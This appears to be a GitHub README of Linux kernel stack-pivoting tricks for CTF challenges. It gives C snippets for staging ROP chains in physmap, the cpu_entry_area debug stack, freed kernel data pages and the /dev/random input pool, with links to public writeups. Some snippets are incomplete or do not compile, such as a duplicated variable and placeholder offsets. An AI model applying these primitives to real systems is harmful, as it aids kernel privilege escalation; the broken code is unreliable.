# linux-kernel-stack-pivoting-trick
some tricks for linux kernel stack pivoting in CTF \[with smap|smep|kaslr\]

## direct mapping area [physmap]
- condition: leak physmap address
- exploit: mmap\[or other ways\] to spray rop chain
```c
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char** argv, char** envp)
{
        // spray rop chain 0
        char buf[0x100000] = { 0 };
        for (int i = 0; i < 0x100000 / 0x1000; i++) {
                strcpy(buf+i*0x1000, "XiaozaYaPwner");
        }

        // spray rop chain 1
        char* buf = mmap(NULL, 0x100000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
        for (int i = 0; i < 0x100000 / 0x1000; i++) {
                strcpy(buf+i*0x1000, "XiaozaYaPwner");
        }
        getchar();

        return 0;
}
```
- example: [MINI-LCTF2022 kgadget](https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x03-Kernel-ROP-ret2dir) by [@arttnba3](https://arttnba3.cn/about/) [with smap&&smep, but no kaslr]

## DB_stack [in per-cpu cpu_entry_area]
- condition: leak per-cpu cpu_entry_area after linux 6.2
- exploit: trigger hardware breakpoint to place rop chain in DB_stack
```c
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/ptrace.h>
#define DB_OFFSET(idx) ((void*)(&(((struct user*)0)->u_debugreg[idx])))
pid_t pid;
int status;
char buf[4];

void set_hbp(void *addr)
{
    if (ptrace(PTRACE_POKEUSER, pid, DB_OFFSET(0), addr) == -1)
    {
        printf("Failed to set dr_0\n");
        kill(pid, 9);
        exit(-1);
    }
    unsigned long dr_7 = (1<<0)|(1<<8)|(1<<16)|(1<<17)|(1<<18)|(1<<19);
    if (ptrace(PTRACE_POKEUSER, pid, DB_OFFSET(7), dr_7) == -1)
    {
        printf("Failed to set dr_7\n");
        kill(pid, 9);
        exit(-1);
    }
}

int main(int argc, char **argv, char **env)
{
    pid = fork();
    if (!pid)
    {
        cpu_set_t cpu_set;
        CPU_ZERO(&cpu_set);
        CPU_SET(0, &cpu_set);
        sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

        ptrace(PTRACE_TRACEME, 0, NULL, NULL);
        raise(SIGSTOP);
        // place rop chain
        __asm__(
        "mov r15,   0x11111111;"
        "mov r14,   0x22222222;"
        "mov r13,   0x33333333;"
        "mov r12,   0x44444444;"
        "mov rbp,   0x55555555;"
        "mov rbx,   0x66666666;"
        "mov r11,   0x77777777;"
        "mov r10,   0x88888888;"
        "mov r9,    0x99999999;"
        "mov r8,    0xaaaaaaaa;"
        "mov rax,   0xbbbbbbbb;"
        "mov rcx,   0xcccccccc;"
        "mov rdx,   0xdddddddd;"
        "mov rsi,   0xeeeeeeee;"
        "mov rdi,   0xffffffff;"
        );
        buf[0] = 0;
        exit(1);

    }
    waitpid(pid, &status, 0);
    set_hbp(buf);

    ptrace(PTRACE_CONT, pid, NULL, NULL);
    waitpid(pid, &status, 0);

    ptrace(PTRACE_CONT, pid, NULL, NULL);
    waitpid(pid, &status, 0);

    return 0;
}
```
- example: [SCTF2023 sycrop|moonpray](https://github.com/pray77/CVE-2023-3640) by [@pray77](https://github.com/pray77)
- bypass cea randomization \[in qemu\] [maybe just in CTF]:
  - [make cpu-entry-area great again](https://kqx.io/post/sp0/) - the trick raised by [@kqx](https://kqx.io/about/)
  - I know the trick in [wm_easyker && wm_easynetlink writeup](https://cnitlrt.github.io/wmctf2025/#wm_easyker) by [@cnitlrt](https://cnitlrt.github.io/about/)
  - same respect to [@TlmeT0B4d](https://github.com/TlmeT0B4d)
```c
#include <stdio.h>
#include <stdint.h>
#include <string.h>

int main() {
        unsigned char gdtr[0x100] = {0};
        asm volatile ("sgdt %0" : "=m"(gdtr) );
        uint16_t limit = *(uint16_t*)(gdtr + 0);
        uint64_t base = 0;
        memcpy(&base, gdtr + 2, 8);
        printf("GDTR.limit = 0x%04x\n", limit);
        printf("GDTR.base  = 0x%016llx\n", (unsigned long long)base);
        return 0;
}
```

## a area after kernel data
- condition: leak kbase
- exploit: mmap\[or other ways\] to spray rop chain
```c
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char** argv, char** envp)
{
        // spray rop chain 0
        char buf[0x100000] = { 0 };
        for (int i = 0; i < 0x100000 / 0x1000; i++) {
                strcpy(buf+i*0x1000, "XiaozaYaPwner");
        }

        // spray rop chain 1
        char* buf = mmap(NULL, 0x100000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
        for (int i = 0; i < 0x100000 / 0x1000; i++) {
                strcpy(buf+i*0x1000, "XiaozaYaPwner");
        }
        getchar();

        return 0;
}
```
- example: [WMCTF2025 wm_easyker](https://blog.xmcve.com/2025/09/22/WMCTF2025-Writeup/#title-5) by [@Polaris](https://www.xmcve.com/)
- I test it in my vmware ubuntu22.04, it's ok
```bash
[382880.248520] [*] Leak Data:
[382880.248527]   0000 0x6159617a6f616958 0xdead0072656e7750 0xdeadbeefbeefdead 0xdeadbeefbeefdead   XiaozaYaPwner.\xadޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭ\xde
[382880.248538]   0020 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead   \xad\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭ\xde
[382880.248548]   0040 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead   \xad\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭ\xde
[382880.248558]   0060 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead   \xad\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭ\xde
[382880.248588]   0080 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead   \xad\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭ\xde
[382880.248597]   00a0 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead   \xad\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭ\xde
[382880.248607]   00c0 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead   \xad\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭ\xde
[382880.248616]   00e0 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead   \xad\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭ\xde
[382900.479013] [*] Leak Data:
[382900.479021]   0000 0x6159617a6f616958 0xdead0072656e7750 0xdeadbeefbeefdead 0xdeadbeefbeefdead   XiaozaYaPwner.\xadޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭ\xde
[382900.479032]   0020 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead   \xad\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭ\xde
[382900.479059]   0040 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead   \xad\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭ\xde
[382900.479069]   0060 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead   \xad\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭ\xde
[382900.479078]   0080 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead   \xad\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭ\xde
[382900.479088]   00a0 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead   \xad\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭ\xde
[382900.479097]   00c0 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead   \xad\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭ\xde
[382900.479122]   00e0 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead   \xad\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭ\xde
[382917.639732] [*] Leak Data:
[382917.639746]   0000 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead   \xad\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭ\xde
[382917.639759]   0020 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead   \xad\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭ\xde
[382917.639769]   0040 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead   \xad\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭ\xde
[382917.639780]   0060 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead   \xad\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭ\xde
[382917.639790]   0080 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead   \xad\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭ\xde
[382917.639800]   00a0 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead   \xad\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭ\xde
[382917.639811]   00c0 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead   \xad\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭ\xde
[382917.639821]   00e0 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead   \xad\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭ\xde
```
- Root Case: Since I have not found the cause of this phenomenon, I consulted [@BitsByWill](https://github.com/BitsByWill) and he quickly gave me a root case analysis.I would like to express my sincerest thanks to [@BitsByWill](https://github.com/BitsByWill), but I have not verified it carefully yet, so I will not express it for the time being.

```c
The region of memory in the kernel image is bounded by the symbols __start_bss_decrypted_unused and __end_bss_decrypted. During the kernel initialization procedure, their pages are freed back to the kernel (https://elixir.bootlin.com/linux/v6.16.8/source/arch/x86/mm/mem_encrypt_amd.c#L574) but not unmapped (which I guess is technically fine, since this region of memory is never referenced again from the kernel text/data/bss addresses). 

Thus, when you do your large stack setup, you cause userland page faults, and the kernel will allocate pages to hold your data. These pages may come from the pages that used to back the memory for __start_bss_decrypted_unused to __end_bss_decrypted.
```

## &input_pool.hash.buf
- condition: leak kbase
- example:
  - https://github.com/google/security-research/blob/b8be9f3f78a45abf1da31795d66b38cb7ede79e2/pocs/linux/kernelctf/CVE-2025-21703_lts_2/docs/novel-techniques.md - the trick raised by [@u1f383](https://github.com/u1f383)
  - I know the trick in [wm_easyker && wm_easynetlink writeup](https://cnitlrt.github.io/wmctf2025/#wm_easyker) by [@cnitlrt](https://cnitlrt.github.io/about/)
```c
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

#define WRITE_RANDOM_SIZE 0x100000ul
int main() {
    int random_fd = -1;
    unsigned long* random_data;
    random_fd = open("/dev/random", O_WRONLY);
    random_data = mmap(NULL, WRITE_RANDOM_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    memset(random_data, 'X', WRITE_RANDOM_SIZE);
    // place rop chain
    random_data[A magic offset - please debug + 0] = gadget0;
    random_data[A magic offset - please debug + 1] = gadget1;
    random_data[A magic offset - please debug + 2] = gadget2;
    write(random_fd, random_data, WRITE_RANDOM_SIZE);
}
```
